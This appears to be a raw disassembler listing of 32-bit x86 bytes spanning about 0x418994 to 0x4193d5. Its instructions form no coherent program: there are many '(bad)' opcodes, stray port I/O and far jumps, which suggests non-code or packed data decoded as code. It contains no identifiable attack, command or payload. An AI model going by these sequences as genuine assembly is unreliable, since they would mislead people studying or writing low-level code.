  418994:	popf   
  418995:	or     DWORD PTR [ecx+0x40c3b67e],0x9c6f4061
  41899f:	dec    ebp
  4189a0:	mov    BYTE PTR fs:[ebx],0xaf
  4189a4:	es dec ebp
  4189a6:	aaa    
  4189a7:	shr    ch,1
  4189a9:	add    DWORD PTR [eax-0x522e7716],eax
  4189af:	test   DWORD PTR [esi+eiz*8-0x6f],eax
  4189b3:	xchg   ecx,eax
  4189b4:	ins    BYTE PTR es:[edi],dx
  4189b5:	(bad)  
  4189b6:	out    dx,eax
  4189b7:	lds    ebx,FWORD PTR [ecx+0x37c94f0a]
  4189bd:	xchg   BYTE PTR [eax],ah
  4189bf:	add    bh,BYTE PTR [ebp-0x35]
  4189c2:	sbb    eax,0x2a9a09ab
  4189c7:	jmp    0x418a27
  4189c9:	sbb    bl,BYTE PTR [ecx+0x2ccbdacb]
  4189cf:	ss mov edi,0x34d21056
  4189d5:	adc    edi,edi
  4189d7:	xchg   BYTE PTR [edx],bl
  4189d9:	and    DWORD PTR [ebx+0x47],esi
  4189dc:	mov    eax,ds:0x8f85e846
  4189e1:	fs jp  0x418999
  4189e4:	adc    ch,ch
  4189e6:	stos   DWORD PTR es:[edi],eax
  4189e7:	jo     0x418a4e
  4189e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ea:	into   
  4189eb:	test   ch,0xc3
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x7dad8f69
  418a65:	das    
  418a66:	or     DWORD PTR [bx+di],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR [ebx+ebp*4+0x42],dl
  418a71:	dec    ecx
  418a72:	lods   eax,DWORD PTR ds:[esi]
  418a73:	cmp    eax,0x9f51e785
  418a78:	popf   
  418a79:	(bad)  
  418a7a:	retf   0x762f
  418a7d:	fwait
  418a7e:	sub    DWORD PTR [edi-0x3f],edx
  418a81:	add    al,0x66
  418a83:	jge    0x418ac4
  418a85:	cwde   
  418a86:	retf   
  418a87:	jbe    0x418a6f
  418a89:	push   0x5f773fe1
  418a8e:	outs   dx,DWORD PTR ds:[esi]
  418a8f:	pop    ebx
  418a90:	push   eax
  418a91:	daa    
  418a92:	int3   
  418a93:	test   edi,0x695c05ac
  418a99:	sub    edi,DWORD PTR [eax]
  418a9b:	outs   dx,BYTE PTR ds:[esi]
  418a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a9d:	ins    DWORD PTR es:[edi],dx
  418a9e:	pop    ebp
  418a9f:	sahf   
  418aa0:	xchg   ecx,eax
  418aa1:	inc    esi
  418aa2:	dec    eax
  418aa3:	sahf   
  418aa4:	mov    ebp,0x24e0350d
  418aa9:	inc    eax
  418aaa:	dec    ebp
  418aab:	jmp    0xa91656cb
  418ab0:	cmp    DWORD PTR [edx],edi
  418ab2:	jnp    0x418ae8
  418ab4:	call   0xa91418fd
  418ab9:	ins    BYTE PTR es:[edi],dx
  418aba:	mov    ds:0x543ef384,al
  418abf:	inc    esp
  418ac0:	adc    BYTE PTR [ebx],cl
  418ac2:	xchg   DWORD PTR [ebx+ebp*1],eax
  418ac5:	in     al,0x92
  418ac7:	neg    DWORD PTR [edx-0x6186386b]
  418acd:	cdq    
  418ace:	sub    DWORD PTR [ebx-0x2],esi
  418ad1:	cli    
  418ad2:	add    al,0x9c
  418ad4:	enter  0x3440,0xbf
  418ad8:	int    0x9
  418ada:	in     eax,0x78
  418adc:	pop    eax
  418add:	nop
  418ade:	sbb    BYTE PTR [eax+0x6f],bl
  418ae1:	pop    es
  418ae2:	add    eax,edi
  418ae4:	retf   
  418ae5:	mov    ebp,0xd1da975
  418aea:	(bad)  
  418aeb:	pop    ecx
  418aec:	cmp    DWORD PTR [ebp+0x4a],eax
  418aef:	sbb    eax,0xaedb9f28
  418af4:	jmp    0x429f073e
  418af9:	scas   eax,DWORD PTR es:[edi]
  418afa:	and    ebx,DWORD PTR [ecx+eiz*1]
  418afd:	in     eax,0x52
  418aff:	mov    DWORD PTR [esi+0x29041f39],ebp
  418b05:	jle    0x418aac
  418b07:	enter  0xab3f,0xb6
  418b0b:	(bad)  
  418b0c:	fldenv [edx]
  418b0e:	pop    ebp
  418b0f:	psubw  mm0,mm1
  418b12:	stos   DWORD PTR es:[edi],eax
  418b13:	xchg   edx,eax
  418b14:	iret   
  418b15:	test   BYTE PTR [edx+0x2e],cl
  418b18:	icebp  
  418b19:	and    bl,ah
  418b1b:	pop    ecx
  418b1c:	mov    ecx,0x45fb2c2e
  418b21:	sub    bl,dl
  418b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b24:	pushf  
  418b25:	scas   eax,DWORD PTR es:[edi]
  418b26:	shl    DWORD PTR [esi+0x163ea26c],1
  418b2c:	xchg   DWORD PTR [edx+0x8],edx
  418b2f:	pop    esp
  418b30:	xor    DWORD PTR [ecx-0x9],ecx
  418b33:	or     ch,bh
  418b35:	xor    al,0x51
  418b37:	in     al,0x8a
  418b39:	cwde   
  418b3a:	div    BYTE PTR [edx+0x78f4340f]
  418b40:	cdq    
  418b41:	scas   eax,DWORD PTR es:[edi]
  418b42:	and    DWORD PTR cs:[edx],esp
  418b45:	push   ebp
  418b46:	dec    edi
  418b47:	jg     0x418b68
  418b49:	and    DWORD PTR [edx-0x6cbf1435],edx
  418b4f:	fisubr DWORD PTR es:[edi+ecx*2]
  418b53:	sbb    ah,BYTE PTR [edx-0x4de87a6]
  418b59:	and    BYTE PTR [esi-0x43],bl
  418b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b5d:	jns    0x418ae0
  418b5f:	cmp    al,BYTE PTR [ecx+0x75]
  418b62:	and    DWORD PTR [edx*2-0x7dc00d84],edx
  418b69:	jmp    0x418b6e
  418b6b:	mov    bh,0x4a
  418b6d:	rol    BYTE PTR [eax],0x0
	...
  418bd4:	add    BYTE PTR [eax],al
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x9
  418be3:	clc    
  418be4:	lods   al,BYTE PTR ds:[esi]
  418be5:	shl    DWORD PTR [edi+0xa],0x1
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [ebp-0x11],bl
  418bf0:	push   cs
  418bf1:	and    eax,0xbb399498
  418bf6:	mov    cl,0x72
  418bf8:	into   
  418bf9:	jne    0x418bcf
  418bfb:	push   0xffffff98
  418bfd:	jg     0x418bdd
  418bff:	in     al,dx
  418c00:	sbb    BYTE PTR ds:0x688a1e4e,bh
  418c06:	and    ebx,DWORD PTR [edi+ebp*2]
  418c09:	adc    ebp,DWORD PTR [eax]
  418c0b:	mov    al,0x9a
  418c0d:	fldenv [ecx+0x40]
  418c10:	data16 (bad) 
  418c12:	sti    
  418c13:	mov    esp,0x86cbde55
  418c18:	les    ebx,FWORD PTR [ecx-0x3ff00598]
  418c1e:	dec    ecx
  418c1f:	jo     0x418be4
  418c21:	and    eax,DWORD PTR [ecx-0x23]
  418c24:	mov    edx,0x7ebb72ad
  418c29:	jp     0x418c55
  418c2b:	jge    0x418c04
  418c2d:	(bad)  
  418c2e:	lahf   
  418c2f:	inc    ecx
  418c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c31:	sti    
  418c32:	mov    ch,0xf7
  418c34:	xlat   BYTE PTR ds:[ebx]
  418c35:	sbb    al,0xfa
  418c37:	in     eax,0x29
  418c39:	enter  0x9783,0xd3
  418c3d:	fbld   TBYTE PTR [edi+eax*1]
  418c40:	test   DWORD PTR [ecx-0x22],0x77153553
  418c47:	xor    BYTE PTR [esp+esi*8],cl
  418c4a:	fbld   TBYTE PTR [eax-0x5f]
  418c4d:	cli    
  418c4e:	xchg   esi,eax
  418c4f:	or     edi,esi
  418c51:	shr    BYTE PTR [ecx-0x9202232],1
  418c57:	jmp    0x1f52e1dc
  418c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c5d:	(bad)  
  418c5e:	(bad)  
  418c5f:	das    
  418c60:	popa   
  418c61:	je     0x418cd9
  418c63:	pop    ebx
  418c64:	mov    ds:0x309e3929,eax
  418c69:	test   eax,0x749a4259
  418c6e:	addr16 dec esp
  418c70:	jb     0x418c09
  418c72:	sbb    BYTE PTR [esi+0x43],dh
  418c75:	fsubr  DWORD PTR [ecx+esi*8]
  418c78:	add    DWORD PTR [ecx+edi*1],0xfa84f0a6
  418c7f:	ins    DWORD PTR es:[edi],dx
  418c80:	xchg   BYTE PTR [ebp+0x6cdd1f85],al
  418c86:	(bad)  
  418c87:	cmp    esi,edx
  418c89:	rcl    al,cl
  418c8b:	in     eax,0x69
  418c8d:	add    esi,DWORD PTR [ebp-0x5e67fd4a]
  418c93:	xchg   esp,eax
  418c94:	sbb    ecx,DWORD PTR [ecx+0x1a2a6651]
  418c9a:	rol    ebx,cl
  418c9c:	sbb    al,0x44
  418c9e:	xchg   ebp,eax
  418c9f:	paddd  mm2,mm5
  418ca2:	loope  0x418c27
  418ca4:	(bad)  
  418ca5:	mov    WORD PTR [edx+0x40cad19a],ss
  418cab:	jbe    0x418c8e
  418cad:	lahf   
  418cae:	jnp    0x418c32
  418cb0:	xor    edx,esi
  418cb2:	push   esi
  418cb3:	stc    
  418cb4:	mov    ds:0x4e05348d,eax
  418cb9:	or     edi,eax
  418cbb:	push   ecx
  418cbc:	fwait
  418cbd:	xchg   edi,eax
  418cbe:	imul   esi,DWORD PTR [ebp+0x5f],0x5edc00d4
  418cc5:	xor    esi,eax
  418cc7:	mov    ch,0x23
  418cc9:	inc    esp
  418cca:	into   
  418ccb:	sti    
  418ccc:	jo     0x418c94
  418cce:	mov    cl,0x4a
  418cd0:	mov    al,ds:0x86679f5c
  418cd5:	gs out 0x80,al
  418cd8:	lds    ebp,FWORD PTR [ebx+eax*1-0x6ac3882c]
  418cdf:	cld    
  418ce0:	stos   DWORD PTR es:[edi],eax
  418ce1:	cs or  eax,0xe3267ac
  418ce7:	mov    esp,0x663af611
  418cec:	ins    DWORD PTR es:[edi],dx
  418ced:	pusha  
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	shl    cl,cl
  418d63:	icebp  
  418d64:	mov    al,0xf8
  418d66:	or     eax,DWORD PTR [bx+di]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    ch,ah
  418d6f:	mov    ds:0x333ff180,eax
  418d74:	xor    edi,DWORD PTR [eax]
  418d76:	mov    ch,0xf1
  418d78:	jnp    0x418d2b
  418d7a:	xchg   esp,eax
  418d7b:	ss inc eax
  418d7d:	mov    BYTE PTR [ebp+0x7a],cl
  418d80:	lea    ebp,[eax+ebp*4-0x61]
  418d84:	daa    
  418d85:	mov    DWORD PTR [ebp-0x3b8da63f],edi
  418d8b:	xor    BYTE PTR [edx+edi*8+0x7b],cl
  418d8f:	and    DWORD PTR [ecx+0x7594456a],edx
  418d95:	xchg   edi,eax
  418d96:	hlt    
  418d97:	xor    edx,esp
  418d99:	stos   BYTE PTR es:[edi],al
  418d9a:	fimul  WORD PTR [edi+0x33]
  418d9d:	int    0xc9
  418d9f:	sub    DWORD PTR [edx],0x66364470
  418da5:	rcr    bl,cl
  418da7:	jg     0x418de3
  418da9:	test   DWORD PTR [edi],ebp
  418dab:	jns    0x418d6a
  418dad:	fs cdq 
  418daf:	push   es
  418db0:	nop
  418db1:	dec    edx
  418db2:	int3   
  418db3:	in     al,0x6
  418db5:	push   cs
  418db6:	retf   0x59cf
  418db9:	lds    eax,FWORD PTR [ebx-0x58]
  418dbc:	aas    
  418dbd:	popf   
  418dbe:	dec    edi
  418dbf:	cli    
  418dc0:	and    esi,DWORD PTR [eax-0x30]
  418dc3:	adc    ebp,0xffffffb2
  418dc6:	iret   
  418dc7:	call   0xce61:0x4cc0d26
  418dce:	push   esp
  418dcf:	xor    bl,BYTE PTR [edx-0x23]
  418dd2:	lods   al,BYTE PTR ds:[esi]
  418dd3:	and    edx,DWORD PTR [edi]
  418dd5:	call   0xcf475d94
  418dda:	mov    WORD PTR [esi],es
  418ddc:	mov    ah,0xde
  418dde:	and    al,0x1b
  418de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de1:	inc    edi
  418de2:	push   ebp
  418de3:	into   
  418de4:	and    BYTE PTR [ecx],bl
  418de6:	push   edx
  418de7:	test   eax,0xf345aed8
  418dec:	sahf   
  418ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dee:	pushf  
  418def:	mov    edi,0xb40ea989
  418df4:	mov    esi,DWORD PTR [edi-0x5]
  418df7:	mov    edi,DWORD PTR [edx-0x36]
  418dfa:	jg     0x418da7
  418dfc:	xor    eax,0x2624e207
  418e01:	cli    
  418e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e03:	(bad)  
  418e04:	fwait
  418e05:	mov    ss,esp
  418e07:	push   edx
  418e08:	cwde   
  418e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e0a:	jb     0x418e47
  418e0c:	pop    ebp
  418e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e0e:	push   esp
  418e0f:	mov    al,0x1
  418e11:	dec    ebp
  418e12:	leave  
  418e13:	fldcw  WORD PTR [ebp-0x66ce7194]
  418e19:	pop    eax
  418e1a:	inc    ebx
  418e1b:	js     0x418e1c
  418e1d:	stos   BYTE PTR es:[edi],al
  418e1e:	mov    ebp,0x6e31a830
  418e23:	sbb    BYTE PTR [ecx],cl
  418e25:	mov    esp,0xfd0b2dfd
  418e2a:	fld    QWORD PTR [ecx]
  418e2c:	adc    dh,al
  418e2e:	push   ecx
  418e2f:	jecxz  0x418e54
  418e31:	add    BYTE PTR [ebx],dh
  418e33:	je     0x418e63
  418e35:	retf   
  418e36:	pop    eax
  418e37:	in     al,dx
  418e38:	pop    edx
  418e39:	punpckhwd mm4,mm7
  418e3c:	mov    eax,0x788bdaa8
  418e41:	or     dh,BYTE PTR [edx+0x64]
  418e44:	ds inc edi
  418e46:	xor    eax,0xb8771f31
  418e4b:	cs inc ebp
  418e4d:	sub    eax,0xc0c27db2
  418e52:	pop    ds
  418e53:	test   BYTE PTR ds:0x875f7279,ah
  418e59:	and    ebx,ecx
  418e5b:	clc    
  418e5c:	ja     0x418dfa
  418e5e:	sahf   
  418e5f:	or     ch,BYTE PTR [ecx+0x7d6d29df]
  418e65:	je     0x418dee
  418e67:	jmp    FWORD PTR [ecx+0x6195b99f]
  418e6d:	test   DWORD PTR [eax],0x0
	...
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	add    BYTE PTR [esi],cl
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x8]
  418ee3:	xchg   bh,ah
  418ee5:	retf   0xc67
  418ee8:	add    DWORD PTR [eax],eax
  418eea:	add    BYTE PTR [ecx],al
  418eec:	add    BYTE PTR [eax],al
  418eee:	add    eax,0xab66c8af
  418ef3:	add    DWORD PTR [edi-0x8],edx
  418ef6:	push   edi
  418ef7:	push   0x9
  418ef9:	mov    cl,0x65
  418efb:	mov    esi,0x6fc0bbb6
  418f00:	test   BYTE PTR [esi],cl
  418f02:	lahf   
  418f03:	jle    0x418ec6
  418f05:	jge    0x418f28
  418f07:	sbb    ah,BYTE PTR [eax+0x2b0320bd]
  418f0d:	rcl    DWORD PTR [ecx],1
  418f0f:	dec    ebp
  418f10:	mov    esi,DWORD PTR [esi]
  418f12:	adc    al,0x3b
  418f14:	lea    edi,[eax+0xf]
  418f17:	jne    0x418f87
  418f19:	addr16 or eax,0x4974beaa
  418f1f:	mov    dl,0x75
  418f21:	loop   0x418f99
  418f23:	dec    esp
  418f24:	out    dx,al
  418f25:	mov    edx,0x7bcedb6a
  418f2a:	ficom  WORD PTR [edx]
  418f2c:	cmc    
  418f2d:	jle    0x418f7d
  418f2f:	cwde   
  418f30:	dec    esp
  418f31:	jno    0x418ee4
  418f33:	out    dx,eax
  418f34:	push   0x1103d0d8
  418f39:	jne    0x418f3c
  418f3b:	neg    BYTE PTR [ebx+0x1b]
  418f3e:	test   DWORD PTR [ebp+0x2c],edi
  418f41:	pop    ecx
  418f42:	(bad)  
  418f43:	sub    al,0x43
  418f45:	enter  0x9368,0x2e
  418f49:	ins    BYTE PTR es:[edi],dx
  418f4a:	push   0x7e6e4755
  418f4f:	ficom  DWORD PTR ds:0xdc9cdfef
  418f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f56:	in     al,0x9c
  418f58:	push   eax
  418f59:	push   esp
  418f5a:	xchg   edi,eax
  418f5b:	cwde   
  418f5c:	sti    
  418f5d:	cmc    
  418f5e:	sub    cl,bl
  418f60:	sbb    dl,dh
  418f62:	leave  
  418f63:	jg     0x418f78
  418f65:	out    0xfd,eax
  418f67:	adc    BYTE PTR [edx+0x484e5e53],ah
  418f6d:	pop    ss
  418f6e:	add    ebp,DWORD PTR [ebx]
  418f70:	(bad)  
  418f71:	int3   
  418f72:	adc    BYTE PTR [edx+0x5c041f13],bh
  418f78:	xor    bl,BYTE PTR [ecx-0xb]
  418f7b:	ja     0x418f02
  418f7d:	xchg   BYTE PTR [eax],ch
  418f7f:	xchg   edi,eax
  418f80:	cld    
  418f81:	bound  ebx,QWORD PTR [edi+0x66]
  418f84:	jmp    0x418f40
  418f86:	je     0x418f33
  418f88:	and    eax,0x7dbd1f6c
  418f8d:	or     BYTE PTR [ebx],bl
  418f8f:	outs   dx,DWORD PTR ds:[esi]
  418f90:	inc    edx
  418f91:	pop    es
  418f92:	sub    dh,BYTE PTR [ecx-0x5a]
  418f95:	out    0x74,eax
  418f97:	jo     0x418ff6
  418f99:	(bad)  
  418f9a:	nop    DWORD PTR [ecx-0xf]
  418f9e:	rol    bl,0x32
  418fa1:	mov    ch,0xd7
  418fa3:	or     edx,DWORD PTR [ebx+0x59]
  418fa6:	aad    0x18
  418fa8:	sub    al,0x55
  418faa:	popf   
  418fab:	xchg   BYTE PTR ds:0xb949f21f,ah
  418fb1:	push   edi
  418fb2:	sbb    eax,0xf3f39a00
  418fb7:	push   0x23
  418fb9:	not    DWORD PTR [eax]
  418fbb:	data16 sti 
  418fbd:	add    ecx,edx
  418fbf:	iret   
  418fc0:	cmp    al,0xac
  418fc2:	cmp    bl,BYTE PTR [esi-0x4ec98887]
  418fc8:	jmp    0x3946:0x60e9c65a
  418fcf:	jnp    0x418f56
  418fd1:	jl     0x418fed
  418fd3:	(bad)  
  418fd5:	jmp    FWORD PTR ds:0xab8dc73
  418fdb:	sub    al,ch
  418fdd:	in     eax,dx
  418fde:	gs jl  0x419042
  418fe1:	mov    ds:0x7b7847e5,al
  418fe6:	push   0xa961a313
  418feb:	add    edx,DWORD PTR [edx]
  418fed:	jl     0x418fef
	...
  419053:	add    BYTE PTR [eax],al
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x56eaf1a7]
  419063:	or     ch,BYTE PTR [edx+eiz*2+0x10d67]
  41906a:	add    BYTE PTR [ecx],al
  41906c:	add    BYTE PTR [eax],al
  41906e:	pop    ds
  41906f:	retf   0xf09f
  419072:	idiv   edx
  419074:	push   ebx
  419075:	mov    esp,fs
  419077:	push   ebx
  419078:	outs   dx,DWORD PTR ds:[esi]
  419079:	dec    eax
  41907a:	mov    edx,0x933113ea
  41907f:	or     BYTE PTR ds:0xd77440ea,ah
  419085:	and    ch,BYTE PTR [esi]
  419087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419088:	enter  0xfaaf,0xf3
  41908c:	dec    ecx
  41908d:	in     eax,0x11
  41908f:	enter  0x85be,0xe9
  419093:	dec    ebx
  419094:	inc    ebp
  419095:	jae    0x41908f
  419097:	sbb    esp,ecx
  419099:	pushf  
  41909a:	pop    ebx
  41909b:	aas    
  41909c:	stos   DWORD PTR es:[edi],eax
  41909d:	lahf   
  41909e:	xor    al,0x3d
  4190a0:	mov    dh,0xb4
  4190a2:	xor    al,0x1c
  4190a4:	ror    BYTE PTR [ebp-0x68446071],cl
  4190aa:	inc    esp
  4190ab:	ret    
  4190ac:	in     eax,dx
  4190ad:	mov    ecx,0x59c22978
  4190b2:	fsubr  QWORD PTR [ecx+esi*2+0x6a8054fc]
  4190b9:	das    
  4190ba:	aas    
  4190bb:	sbb    DWORD PTR [edx+esi*8+0x7],ebx
  4190bf:	dec    edi
  4190c0:	mov    ebx,DWORD PTR [esi-0x3170defe]
  4190c6:	xor    al,0x70
  4190c8:	dec    esp
  4190c9:	test   eax,0xc0fec236
  4190ce:	fnstsw WORD PTR [ebx+0x57]
  4190d1:	test   eax,0x4b314165
  4190d6:	pushaw 
  4190d8:	shl    BYTE PTR [esi+0x8],0xf0
  4190dc:	dec    ecx
  4190dd:	sub    eax,0x4e4777d6
  4190e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190e3:	push   0xffffffd7
  4190e5:	les    ebx,FWORD PTR [ebx]
  4190e7:	out    0x40,al
  4190e9:	pop    ss
  4190ea:	in     eax,0xb5
  4190ec:	mov    ds:0x76c32797,al
  4190f1:	rcl    BYTE PTR [ecx],cl
  4190f3:	jmp    0x419172
  4190f5:	outs   dx,DWORD PTR ds:[esi]
  4190f6:	mov    dl,0xa
  4190f8:	iret   
  4190f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190fa:	cmp    BYTE PTR [esi-0x5abcb50c],bl
  419100:	dec    edi
  419101:	push   es
  419102:	pop    esp
  419103:	popa   
  419104:	pop    ecx
  419105:	inc    sp
  419107:	xor    al,0xa4
  419109:	xchg   ebx,eax
  41910a:	xor    eax,0x38ed3d8a
  41910f:	xor    eax,edi
  419111:	scas   al,BYTE PTR es:[edi]
  419112:	ret    0xe731
  419115:	ror    ch,cl
  419117:	enter  0xb7b9,0x3
  41911b:	jbe    0x4190ce
  41911d:	mov    BYTE PTR [eax-0x6ea963d0],ah
  419123:	pop    ebp
  419124:	jbe    0x419167
  419126:	repnz mov ch,BYTE PTR [edi]
  419129:	jmp    0x82dd:0x83388bc3
  419130:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  419132:	jnp    0x419145
  419134:	jge    0x419162
  419136:	mov    ecx,0x4a1c0aa9
  41913b:	or     bl,BYTE PTR [ebx-0x23]
  41913e:	test   bl,bl
  419140:	repnz popf 
  419142:	mov    cs,WORD PTR [ebx]
  419144:	or     ebx,ebx
  419146:	daa    
  419147:	pop    es
  419148:	cli    
  419149:	add    BYTE PTR [eax-0x39],0xb8
  41914d:	stos   DWORD PTR es:[edi],eax
  41914e:	popa   
  41914f:	fwait
  419150:	mov    esi,eax
  419152:	stos   DWORD PTR es:[edi],eax
  419153:	(bad)  
  419155:	mov    esi,0xcc90c5ef
  41915a:	cs sahf 
  41915c:	out    dx,al
  41915d:	xchg   DWORD PTR [ebx+0x3b851329],ebp
  419163:	push   0x24481b96
  419168:	idiv   ch
  41916a:	mov    edi,0x2aee19
	...
  4191d3:	add    BYTE PTR [eax],al
  4191d5:	add    BYTE PTR [edi-0x41bd617b],ch
  4191db:	pop    ebx
  4191dc:	(bad)  
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     cl,BYTE PTR [ebx+0x61]
  4191e4:	jno    0x4191ca
  4191e6:	addr16 push cs
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	jnp    0x4191c0
  4191f0:	pop    esi
  4191f1:	fstp   DWORD PTR [ecx+0x2f]
  4191f4:	das    
  4191f5:	fbstp  TBYTE PTR [edx+0x40]
  4191f8:	std    
  4191f9:	mov    DWORD PTR [ebx-0xa5ab1e5],ebx
  4191ff:	ds out 0x4e,al
  419202:	adc    DWORD PTR [ebp-0x25be1dd7],edi
  419208:	retf   0x7e08
  41920b:	jbe    0x4191f3
  41920d:	ja     0x419248
  41920f:	mov    ds,WORD PTR [ebx+ebp*8]
  419212:	jle    0x41925a
  419214:	cdq    
  419215:	cwde   
  419216:	push   0x52ab819f
  41921b:	mov    ds:0xdeaee836,eax
  419220:	mov    ds:0x760f01e3,al
  419225:	sbb    edi,eax
  419227:	fwait
  419228:	or     ebp,ecx
  41922a:	inc    eax
  41922b:	js     0x4191c3
  41922d:	add    edi,edx
  41922f:	push   esp
  419230:	adc    ecx,0x665dcc8c
  419236:	pop    ebp
  419237:	popf   
  419238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419239:	(bad)  
  41923a:	push   ecx
  41923b:	jg     0x41924a
  41923d:	ja     0x419271
  41923f:	xor    edi,ebx
  419241:	xchg   edi,eax
  419242:	clc    
  419243:	in     eax,dx
  419244:	jne    0x41926a
  419246:	xor    dl,bh
  419248:	mov    dl,0x5a
  41924a:	int    0x91
  41924c:	or     ah,BYTE PTR [ebx+0x4d]
  41924f:	xor    DWORD PTR [ebp+0x25bceb78],ebx
  419255:	fdiv   DWORD PTR [eax]
  419257:	push   ss
  419258:	popa   
  419259:	push   0xffffff88
  41925b:	add    BYTE PTR [ecx-0x6e],0x50
  41925f:	retf   0xf51b
  419262:	jmp    0xadeb:0x78b87873
  419269:	add    al,BYTE PTR [ebp+ecx*4-0x5db6485]
  419270:	imul   ebx
  419272:	mov    esp,0xd368197c
  419277:	test   edi,0x91c56ecb
  41927d:	push   edi
  41927e:	jne    0x4192f2
  419280:	or     esp,edi
  419282:	test   ch,0x8f
  419285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419286:	inc    ecx
  419287:	das    
  419288:	ss sbb edi,edi
  41928b:	cs (bad) 
  41928d:	addr16 es xchg ebp,eax
  419290:	and    esp,DWORD PTR [edi]
  419292:	mov    ds:0x218de6f5,eax
  419297:	stc    
  419298:	adc    BYTE PTR [ebp+esi*4+0x43],dl
  41929c:	mov    al,ds:0x365390a
  4192a1:	inc    bl
  4192a3:	pop    ebx
  4192a4:	(bad)  
  4192a5:	repnz cmp dl,BYTE PTR [ecx+edi*1-0x53a2bcf6]
  4192ad:	add    al,BYTE PTR gs:[esi+0x65]
  4192b1:	and    edx,DWORD PTR [esi]
  4192b3:	jo     0x41929f
  4192b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192b6:	push   eax
  4192b7:	cmp    BYTE PTR [eax],dh
  4192b9:	xchg   edi,eax
  4192ba:	aam    0x36
  4192bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192bd:	popa   
  4192be:	repnz jecxz 0x4192df
  4192c1:	cmp    dh,ch
  4192c3:	iret   
  4192c4:	arpl   WORD PTR [esi],sp
  4192c6:	cmp    eax,ecx
  4192c8:	push   ebp
  4192c9:	cs inc ecx
  4192cb:	push   ecx
  4192cc:	retf   
  4192cd:	push   ds
  4192ce:	dec    edi
  4192cf:	jns    0x4192d7
  4192d1:	or     DWORD PTR [edx-0x5ef8abf],0xab692333
  4192db:	in     al,dx
  4192dc:	iret   
  4192dd:	xor    al,0x3f
  4192df:	or     eax,0x139d9be
  4192e4:	xor    ah,dl
  4192e6:	mov    dh,0xef
  4192e8:	or     eax,0x5055e9ad
  4192ed:	icebp  
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	sbb    DWORD PTR [edi+ebp*1+0x10f6756],edi
  419369:	add    BYTE PTR [eax],al
  41936b:	add    DWORD PTR [eax],eax
  41936d:	add    al,al
  41936f:	imul   edi,DWORD PTR [esi+0x1ac1477e],0xfb6537b5
  419379:	ds dec esp
  41937b:	pop    ecx
  41937c:	xchg   ecx,eax
  41937d:	fbld   TBYTE PTR [ebp+0x3d]
  419380:	loop   0x419347
  419382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419383:	xchg   ebx,eax
  419384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419385:	push   cs
  419386:	sti    
  419387:	mov    ds:0xd1a583eb,eax
  41938c:	mov    ds:0xdad2687b,al
  419391:	and    BYTE PTR [edx],dh
  419393:	bound  ebx,QWORD PTR [esp+eax*2-0x4165239e]
  41939a:	dec    edx
  41939b:	sub    al,0x99
  41939d:	push   0x14efcdb0
  4193a2:	shl    DWORD PTR [ecx],0xd1
  4193a5:	inc    esp
  4193a6:	data16 data16 sbb al,0x27
  4193aa:	sbb    BYTE PTR [esp+esi*4+0x46],0x13
  4193af:	(bad)  
  4193b0:	std    
  4193b1:	jecxz  0x419426
  4193b3:	mov    ah,0x7a
  4193b5:	xchg   esp,eax
  4193b6:	mov    ecx,0x8ee801bf
  4193bb:	std    
  4193bc:	pop    ecx
  4193bd:	repnz pop ss
  4193bf:	xor    DWORD PTR [edx+0x71],edx
  4193c2:	sub    al,0xac
  4193c4:	jnp    0x419433
  4193c6:	leave  
  4193c7:	inc    ebx
  4193c8:	out    0xf8,eax
  4193ca:	mov    edx,0x6ccdcea1
  4193cf:	addr16 xor eax,0xdbcdfb4f
  4193d5:	pop    ds
